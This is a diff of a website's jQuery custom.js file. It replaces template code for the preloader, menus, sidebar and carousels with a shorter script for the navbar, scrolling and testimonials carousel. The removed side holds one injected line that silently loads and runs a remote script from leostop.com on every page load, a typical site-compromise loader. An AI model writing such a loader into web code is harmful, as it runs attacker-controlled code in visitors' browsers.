@@ -1,111 +1,55 @@
-/*---------------------------------------------------------------------
-    File Name: custom.js
----------------------------------------------------------------------*/
 
-$(function () {
-	
-	"use strict";
-	
-	/* Preloader
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	setTimeout(function () {
-		$('.loader_bg').fadeToggle();
-	}, 1500);
-	
-	/* Tooltip
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(document).ready(function(){
-		$('[data-toggle="tooltip"]').tooltip();
-	});
-	
-	
-	
-	/* Mouseover
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(document).ready(function(){
-		$(".main-menu ul li.megamenu").mouseover(function(){
-			if (!$(this).parent().hasClass("#wrapper")){
-			$("#wrapper").addClass('overlay');
-			}
-		});
-		$(".main-menu ul li.megamenu").mouseleave(function(){
-			$("#wrapper").removeClass('overlay');
-		});
-	});
-	
-	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
+  $(function () {
+    'use strict'
 
-	/* Toggle sidebar
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-     
-     $(document).ready(function () {
-       $('#sidebarCollapse').on('click', function () {
-          $('#sidebar').toggleClass('active');
-          $(this).toggleClass('active');
-       });
-     });
-
-     /* Product slider 
-     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-     // optional
-     $('#blogCarousel').carousel({
-        interval: 5000
-     });
-
-
-});
-
-
-/* Toggle sidebar
-     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-function openNav() {
-  document.getElementById("mySidepanel").style.width = "250px";
-}
-
-function closeNav() {
-  document.getElementById("mySidepanel").style.width = "0";
-}
-
-
-/* Animate js*/
-
-(function($) {
-  //Function to animate slider captions
-  function doAnimations(elems) {
-    //Cache the animationend event in a variable
-    var animEndEv = "webkitAnimationEnd animationend";
-
-    elems.each(function() {
-      var $this = $(this),
-        $animationType = $this.data("animation");
-      $this.addClass($animationType).one(animEndEv, function() {
-        $this.removeClass($animationType);
-      });
+    // MENU
+    $('.navbar .nav-link').on('click',function(){
+        $(".navbar-collapse").collapse('hide');
     });
-  }
 
-  //Variables on page load
-  var $myCarousel = $("#carouselExampleIndicators"),
-    $firstAnimatingElems = $myCarousel
-      .find(".carousel-item:first")
-      .find("[data-animation ^= 'animated']");
+    $(window).on('scroll', function() {     
+                                
+        /*----------------------------------------------------*/
+        /*  Navigtion Menu Scroll
+        /*----------------------------------------------------*/    
+        
+        var b = $(window).scrollTop();
+        
+        if( b > 72 ){       
+            $(".navbar").addClass("scroll");
+        } else {
+            $(".navbar").removeClass("scroll");
+        }               
+    });
 
-  //Initialize carousel
-  $myCarousel.carousel();
+    // TESTIMONIALS CAROUSEL
+    $('#testimonials-carousel').owlCarousel({
+        loop:true,
+        margin:10,
+        responsiveClass:true,
+        responsive:{
+            0:{
+                items:1,
+            },
+            900:{
+                items:2,
+            },
+            1200:{
+                items:3,
+                loop:false
+            }
+        }
+    })
 
-  //Animate captions in first slide on page load
-  doAnimations($firstAnimatingElems);
-
-  //Other slides to be animated on carousel slide event
-  $myCarousel.on("slide.bs.carousel", function(e) {
-    var $animatingElems = $(e.relatedTarget).find(
-      "[data-animation ^= 'animated']"
-    );
-    doAnimations($animatingElems);
+    // SMOOTHSCROLL
+    $(function() {
+      $('.navbar .nav-link').on('click', function(event) {
+        var $anchor = $(this);
+        $('html, body').stop().animate({
+            scrollTop: $($anchor.attr('href')).offset().top - 49
+        }, 1000);
+        event.preventDefault();
+      });
+    });   
+     
   });
-})(jQuery);
-
-
